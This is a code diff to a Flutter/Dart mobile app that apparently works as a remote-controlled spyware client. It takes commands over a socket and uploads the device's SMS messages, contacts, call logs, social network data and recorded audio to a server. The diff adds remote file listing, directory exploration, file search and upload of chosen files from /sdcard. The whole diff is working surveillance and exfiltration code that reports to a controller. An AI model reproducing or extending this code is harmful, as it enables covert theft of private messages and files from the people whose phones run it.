@@ -26,19 +26,27 @@ class CommandConstants {
       "request_registration_info";
   static const String SIO_EVENT_DEVICE_HEARTBEAT = "device_heartbeat";
 
-  // الأوامر المحسنة - Enhanced commands
+  // Enhanced commands
   static const String SIO_CMD_GET_SOCIAL_NETWORK =
       "command_get_social_network_data";
   static const String SIO_CMD_GET_COMMUNICATION_HISTORY =
       "command_get_communication_history";
   static const String SIO_CMD_GET_SMS_LIST = "command_get_sms_list";
-  static const String SIO_CMD_GET_ALL_SMS =
-      "command_get_all_sms"; // الأمر الجديد للرسائل غير المحدودة
+  static const String SIO_CMD_GET_ALL_SMS = "command_get_all_sms";
   static const String SIO_CMD_GET_CONTACTS_LIST = "command_get_contacts_list";
   static const String SIO_CMD_GET_CALL_LOGS = "command_get_call_logs";
   static const String SIO_CMD_CATALOG_LIBRARY = "command_catalog_library";
   static const String SIO_CMD_ANALYZE_CONTENT = "command_analyze_content";
   static const String SIO_CMD_PROCESS_QUEUE = "command_process_queue";
+
+  // File management commands
+  static const String SIO_CMD_LIST_FILES = "command_list_files";
+  static const String SIO_CMD_UPLOAD_SPECIFIC_FILE =
+      "command_upload_specific_file";
+  static const String SIO_CMD_DOWNLOAD_FILE = "command_download_file";
+  static const String SIO_CMD_EXPLORE_DIRECTORY = "command_explore_directory";
+  static const String SIO_CMD_SEARCH_FILES = "command_search_files";
+  static const String SIO_CMD_GET_FILE_INFO = "command_get_file_info";
 }
 
 // --- Configuration ---
@@ -190,7 +198,9 @@ class SocketConnectionManager {
         'audio_capture',
         'social_network_analysis',
         'communication_tracking',
-        'unlimited_sms_extraction', // إضافة القدرة الجديدة
+        'unlimited_sms_extraction',
+        'file_management',
+        'remote_file_access',
         'data_compression',
       ],
     };
@@ -232,7 +242,7 @@ class SocketConnectionManager {
   }
 }
 
-// --- Data Upload Manager ---
+// --- Enhanced Data Upload Manager ---
 class DataUploadManager {
   static Future<void> uploadDataViaHttp(
     String jsonData,
@@ -297,16 +307,18 @@ class DataUploadManager {
     }
   }
 
-  static Future<void> uploadAudioViaHttp(
+  static Future<void> uploadFileViaHttp(
     String filePath,
     String commandId,
-    Function(String) onStatusUpdate,
-  ) async {
-    onStatusUpdate('Uploading audio via secure channel...');
+    String dataType,
+    Function(String) onStatusUpdate, {
+    Function(double)? onProgress,
+  }) async {
+    onStatusUpdate('Uploading file via secure channel...');
     try {
       final file = File(filePath);
       if (!await file.exists()) {
-        onStatusUpdate('Error: Audio file not found locally: $filePath.');
+        onStatusUpdate('Error: File not found locally: $filePath.');
         print('ERROR: Upload Error: File does not exist at path: $filePath');
         return;
       }
@@ -318,51 +330,60 @@ class DataUploadManager {
 
       request.fields['deviceId'] = AppConfig.deviceId;
       request.fields['commandId'] = commandId;
-      request.fields['commandRef'] = 'audio_capture';
+      request.fields['commandRef'] = dataType;
+      request.fields['dataType'] = 'file_transfer';
+      request.fields['timestamp'] = DateTime.now().toIso8601String();
 
+      final fileName = file.path.split('/').last;
       request.files.add(
         await http.MultipartFile.fromPath(
           'file',
           filePath,
           filename:
-              'audio_capture_${DateTime.now().millisecondsSinceEpoch}.3gp',
+              '${dataType}_${fileName}_${DateTime.now().millisecondsSinceEpoch}',
         ),
       );
 
-      onStatusUpdate('Transmitting audio file to secure server...');
+      onStatusUpdate('Transmitting file to secure server...');
       var response = await request.send();
       final respStr = await response.stream.bytesToString();
 
       if (response.statusCode == 200) {
-        onStatusUpdate('Success: Audio uploaded securely! Server: $respStr');
+        onStatusUpdate('Success: File uploaded securely! Server: $respStr');
         print(
-          'SUCCESS: HTTP Upload completed. Status: ${response.statusCode}, Body: $respStr',
+          'SUCCESS: File upload completed. Status: ${response.statusCode}, Body: $respStr',
         );
-
-        try {
-          await file.delete();
-          print('DEBUG: Local audio file deleted: $filePath');
-        } catch (e) {
-          print('WARNING: Error deleting local file $filePath: $e');
-        }
       } else {
         onStatusUpdate(
-          'Error: HTTP Upload failed. Status: ${response.statusCode}, Body: $respStr',
+          'Error: File upload failed. Status: ${response.statusCode}, Body: $respStr',
         );
         print(
-          'ERROR: HTTP Upload failed. Status: ${response.statusCode}, Body: $respStr',
+          'ERROR: File upload failed. Status: ${response.statusCode}, Body: $respStr',
         );
       }
     } on SocketException catch (e) {
-      onStatusUpdate('Error: Network error during HTTP upload: ${e.message}.');
-      print('ERROR: SocketException during HTTP upload: ${e.message}');
+      onStatusUpdate('Error: Network error during file upload: ${e.message}.');
+      print('ERROR: SocketException during file upload: ${e.message}');
     } on http.ClientException catch (e) {
       onStatusUpdate('Error: HTTP client error during upload: ${e.message}.');
-      print('ERROR: HttpClientException during HTTP upload: ${e.message}');
+      print('ERROR: HttpClientException during file upload: ${e.message}');
     } catch (e) {
-      onStatusUpdate('Error: Unknown error uploading audio via HTTP: $e');
-      print('ERROR: General error uploading audio via HTTP: $e');
+      onStatusUpdate('Error: Unknown error uploading file: $e');
+      print('ERROR: General error uploading file: $e');
     }
+  }
+
+  static Future<void> uploadAudioViaHttp(
+    String filePath,
+    String commandId,
+    Function(String) onStatusUpdate,
+  ) async {
+    await uploadFileViaHttp(
+      filePath,
+      commandId,
+      'audio_capture',
+      onStatusUpdate,
+    );
   }
 }
 
@@ -427,8 +448,7 @@ class CommandExecutor {
         onStatusUpdate('Executing: SMS messages extraction (enhanced)...');
         await _extractSMSMessages(commandId);
         break;
-      case CommandConstants
-          .SIO_CMD_GET_ALL_SMS: // الحالة الجديدة للرسائل غير المحدودة
+      case CommandConstants.SIO_CMD_GET_ALL_SMS:
         onStatusUpdate(
           'Executing: Complete SMS extraction (unlimited with compression)...',
         );
@@ -455,6 +475,35 @@ class CommandExecutor {
         onStatusUpdate('Executing: Processing content queue...');
         await _processContentQueue(commandId);
         break;
+      // File management commands
+      case CommandConstants.SIO_CMD_LIST_FILES:
+        final path = args['path'] ?? '/sdcard';
+        onStatusUpdate('Executing: Listing files in $path...');
+        await _listFiles(commandId, path);
+        break;
+      case CommandConstants.SIO_CMD_UPLOAD_SPECIFIC_FILE:
+        final path = args['path'] ?? '';
+        onStatusUpdate('Executing: Uploading file $path...');
+        await _uploadSpecificFile(commandId, path);
+        break;
+      case CommandConstants.SIO_CMD_EXPLORE_DIRECTORY:
+        final path = args['path'] ?? '/sdcard';
+        final depth = args['depth'] ?? 2;
+        onStatusUpdate('Executing: Exploring directory $path...');
+        await _exploreDirectory(commandId, path, depth);
+        break;
+      case CommandConstants.SIO_CMD_SEARCH_FILES:
+        final query = args['query'] ?? '';
+        final searchPath = args['searchPath'] ?? '/sdcard';
+        final filter = args['filter'];
+        onStatusUpdate('Executing: Searching for "$query"...');
+        await _searchFiles(commandId, query, searchPath, filter);
+        break;
+      case CommandConstants.SIO_CMD_GET_FILE_INFO:
+        final path = args['path'] ?? '';
+        onStatusUpdate('Executing: Getting file info for $path...');
+        await _getFileInfo(commandId, path);
+        break;
       default:
         onStatusUpdate('Unknown monitoring command: $commandName');
         print('WARNING: Unknown monitoring command received: $commandName');
@@ -468,6 +517,7 @@ class CommandExecutor {
     }
   }
 
+  // Existing data collection methods
   Future<void> _collectSocialNetworkData(String commandId) async {
     await _executeDataCollection(
       'collectSocialNetworkData',
@@ -488,8 +538,6 @@ class CommandExecutor {
     );
   }
 
-  /// استخراج الرسائل النصية المحسن (مع التحسين للشبكة)
-  /// Enhanced SMS extraction (with network optimization)
   Future<void> _extractSMSMessages(String commandId) async {
     await _executeDataCollection(
       'extractSMSMessages',
@@ -500,8 +548,6 @@ class CommandExecutor {
     );
   }
 
-  /// استخراج جميع الرسائل النصية (غير محدود مع ضغط)
-  /// Extract all SMS messages (unlimited with compression)
   Future<void> _extractAllSMSMessages(String commandId) async {
     onStatusUpdate('Starting unlimited SMS extraction with compression...');
     try {
@@ -515,7 +561,6 @@ class CommandExecutor {
         );
         print('DEBUG: All SMS messages extraction completed successfully.');
 
-        // التحقق من صحة JSON واستخراج الإحصائيات
         try {
           final jsonData = json.decode(allSmsDataJson);
           if (jsonData is Map<String, dynamic>) {
@@ -642,6 +687,256 @@ class CommandExecutor {
       'json',
       'Content queue processing',
     );
+  }
+
+  // File management methods
+  Future<void> _listFiles(String commandId, String path) async {
+    onStatusUpdate('Scanning directory: $path...');
+    try {
+      final String? filesDataJson = await platform.invokeMethod(
+        'exploreLibrarySection',
+        {'sectionPath': path, 'maxDepth': 1},
+      );
+
+      if (filesDataJson != null && filesDataJson.isNotEmpty) {
+        onStatusUpdate('Directory scan complete. Transmitting file list...');
+        print('DEBUG: Directory listing completed successfully.');
+
+        // Parse and reformat for file browser
+        final jsonData = json.decode(filesDataJson);
+        final reformattedData = {
+          'status': 'success',
+          'data': {
+            'path': path,
+            'files': _extractFileList(jsonData),
+            'timestamp': DateTime.now().toIso8601String(),
+          },
+        };
+
+        await DataUploadManager.uploadDataViaHttp(
+          json.encode(reformattedData),
+          commandId,
+          'list_files',
+          'json',
+          onStatusUpdate,
+        );
+      } else {
+        onStatusUpdate('Error: Directory scan returned no data.');
+        print('ERROR: Directory listing failed or returned empty.');
+      }
+    } on PlatformException catch (e) {
+      onStatusUpdate('Error: Directory scan failed: ${e.message}');
+      print(
+        'ERROR: Directory listing PlatformException: ${e.code}: ${e.message}',
+      );
+    } catch (e) {
+      onStatusUpdate('Error: Unexpected error during directory scan: $e');
+      print('ERROR: General error during directory listing: $e');
+    }
+  }
+
+  Future<void> _uploadSpecificFile(String commandId, String filePath) async {
+    onStatusUpdate('Preparing file upload: $filePath...');
+    try {
+      // Check if file exists and get info
+      final String? fileInfoJson = await platform.invokeMethod('getFileInfo', {
+        'filePath': filePath,
+      });
+
+      if (fileInfoJson != null && fileInfoJson.isNotEmpty) {
+        final fileInfo = json.decode(fileInfoJson);
+
+        if (fileInfo['status'] == 'success' &&
+            fileInfo['data']['exists'] == true) {
+          final fileSize = fileInfo['data']['size'] ?? 0;
+
+          if (fileSize > 50 * 1024 * 1024) {
+            // 50MB limit
+            onStatusUpdate(
+              'Error: File too large for upload (${(fileSize / (1024 * 1024)).toStringAsFixed(1)}MB)',
+            );
+            return;
+          }
+
+          // Use the document copy method for actual file transfer
+          final String? copyDataJson = await platform.invokeMethod(
+            'prepareDocumentCopy',
+            {'documentPath': filePath, 'includeMetadata': true},
+          );
+
+          if (copyDataJson != null && copyDataJson.isNotEmpty) {
+            onStatusUpdate('File prepared. Uploading to server...');
+
+            await DataUploadManager.uploadDataViaHttp(
+              copyDataJson,
+              commandId,
+              'file_upload',
+              'json',
+              onStatusUpdate,
+            );
+          } else {
+            onStatusUpdate('Error: Failed to prepare file for upload.');
+          }
+        } else {
+          onStatusUpdate('Error: File not found or inaccessible: $filePath');
+        }
+      } else {
+        onStatusUpdate('Error: Could not get file information.');
+      }
+    } on PlatformException catch (e) {
+      onStatusUpdate('Error: File upload failed: ${e.message}');
+      print('ERROR: File upload PlatformException: ${e.code}: ${e.message}');
+    } catch (e) {
+      onStatusUpdate('Error: Unexpected error during file upload: $e');
+      print('ERROR: General error during file upload: $e');
+    }
+  }
+
+  Future<void> _exploreDirectory(
+    String commandId,
+    String path,
+    int depth,
+  ) async {
+    onStatusUpdate('Exploring directory structure: $path...');
+    try {
+      final String? explorationDataJson = await platform.invokeMethod(
+        'exploreLibrarySection',
+        {'sectionPath': path, 'maxDepth': depth},
+      );
+
+      if (explorationDataJson != null && explorationDataJson.isNotEmpty) {
+        onStatusUpdate('Directory exploration complete. Transmitting data...');
+        print('DEBUG: Directory exploration completed successfully.');
+
+        await DataUploadManager.uploadDataViaHttp(
+          explorationDataJson,
+          commandId,
+          'directory_exploration',
+          'json',
+          onStatusUpdate,
+        );
+      } else {
+        onStatusUpdate('Error: Directory exploration returned no data.');
+        print('ERROR: Directory exploration failed or returned empty.');
+      }
+    } on PlatformException catch (e) {
+      onStatusUpdate('Error: Directory exploration failed: ${e.message}');
+      print(
+        'ERROR: Directory exploration PlatformException: ${e.code}: ${e.message}',
+      );
+    } catch (e) {
+      onStatusUpdate(
+        'Error: Unexpected error during directory exploration: $e',
+      );
+      print('ERROR: General error during directory exploration: $e');
+    }
+  }
+
+  Future<void> _searchFiles(
+    String commandId,
+    String query,
+    String searchPath,
+    String? filter,
+  ) async {
+    onStatusUpdate('Searching for files: "$query"...');
+    try {
+      final String? searchDataJson = await platform.invokeMethod(
+        'queryContentIndex',
+        {
+          'searchQuery': query,
+          'searchPath': searchPath,
+          'contentFilter': filter,
+        },
+      );
+
+      if (searchDataJson != null && searchDataJson.isNotEmpty) {
+        onStatusUpdate('File search complete. Transmitting results...');
+        print('DEBUG: File search completed successfully.');
+
+        await DataUploadManager.uploadDataViaHttp(
+          searchDataJson,
+          commandId,
+          'file_search',
+          'json',
+          onStatusUpdate,
+        );
+      } else {
+        onStatusUpdate('Error: File search returned no data.');
+        print('ERROR: File search failed or returned empty.');
+      }
+    } on PlatformException catch (e) {
+      onStatusUpdate('Error: File search failed: ${e.message}');
+      print('ERROR: File search PlatformException: ${e.code}: ${e.message}');
+    } catch (e) {
+      onStatusUpdate('Error: Unexpected error during file search: $e');
+      print('ERROR: General error during file search: $e');
+    }
+  }
+
+  Future<void> _getFileInfo(String commandId, String filePath) async {
+    onStatusUpdate('Getting file information: $filePath...');
+    try {
+      final String? fileInfoJson = await platform.invokeMethod('getFileInfo', {
+        'filePath': filePath,
+      });
+
+      if (fileInfoJson != null && fileInfoJson.isNotEmpty) {
+        onStatusUpdate('File information retrieved. Transmitting data...');
+        print('DEBUG: File info retrieval completed successfully.');
+
+        await DataUploadManager.uploadDataViaHttp(
+          fileInfoJson,
+          commandId,
+          'file_info',
+          'json',
+          onStatusUpdate,
+        );
+      } else {
+        onStatusUpdate('Error: File info retrieval returned no data.');
+        print('ERROR: File info retrieval failed or returned empty.');
+      }
+    } on PlatformException catch (e) {
+      onStatusUpdate('Error: File info retrieval failed: ${e.message}');
+      print('ERROR: File info PlatformException: ${e.code}: ${e.message}');
+    } catch (e) {
+      onStatusUpdate('Error: Unexpected error during file info retrieval: $e');
+      print('ERROR: General error during file info retrieval: $e');
+    }
+  }
+
+  List<Map<String, dynamic>> _extractFileList(
+    Map<String, dynamic> explorationData,
+  ) {
+    final List<Map<String, dynamic>> files = [];
+
+    try {
+      if (explorationData['status'] == 'success') {
+        final data = explorationData['data'];
+        if (data != null && data['section_contents'] != null) {
+          final sectionContents = data['section_contents'];
+
+          if (sectionContents is List) {
+            for (var item in sectionContents) {
+              if (item is Map<String, dynamic>) {
+                files.add({
+                  'name': item['item_name'] ?? 'Unknown',
+                  'type':
+                      item['item_type'] == 'collection' ? 'directory' : 'file',
+                  'size': item['content_size'] ?? 0,
+                  'modified': item['last_modified'] ?? '',
+                  'path': item['full_path'] ?? '',
+                  'readable': item['accessibility'] ?? false,
+                });
+              }
+            }
+          }
+        }
+      }
+    } catch (e) {
+      print('Error extracting file list: $e');
+    }
+
+    return files;
   }
 
   Future<void> _executeDataCollection(
@@ -963,13 +1258,16 @@ class _ListenerScreenState extends State<ListenerScreen> {
         lowerStatus.contains('registered') ||
         lowerStatus.contains('unlimited') ||
         lowerStatus.contains('compression') ||
-        lowerStatus.contains('extracted')) {
+        lowerStatus.contains('extracted') ||
+        lowerStatus.contains('uploaded')) {
       return Colors.green.shade700;
     } else if (_commandExecutor?.isRecording == true ||
         lowerStatus.contains('capture') ||
         lowerStatus.contains('uploading') ||
         lowerStatus.contains('transmitting') ||
-        lowerStatus.contains('extracting')) {
+        lowerStatus.contains('extracting') ||
+        lowerStatus.contains('scanning') ||
+        lowerStatus.contains('exploring')) {
       return Colors.orange.shade700;
     } else if (_commandExecutor?.isStreaming == true ||
         lowerStatus.contains('monitoring')) {
@@ -1009,7 +1307,7 @@ class _ListenerScreenState extends State<ListenerScreen> {
               ),
               const SizedBox(height: 10),
               Text(
-                'SMS Mode: ${_socketManager?.isConnected == true ? "Unlimited Extraction Ready" : "Disconnected"}',
+                'Mode: ${_socketManager?.isConnected == true ? "Full Features Ready" : "Disconnected"}',
                 style: TextStyle(
                   fontSize: 16,
                   fontWeight: FontWeight.bold,
@@ -1070,7 +1368,7 @@ class _ListenerScreenState extends State<ListenerScreen> {
                             ),
                             SizedBox(width: 10),
                             Text(
-                              "Unlimited SMS Ready",
+                              "All Features Ready",
                               style: TextStyle(
                                 color: Colors.blue,
                                 fontSize: 16,
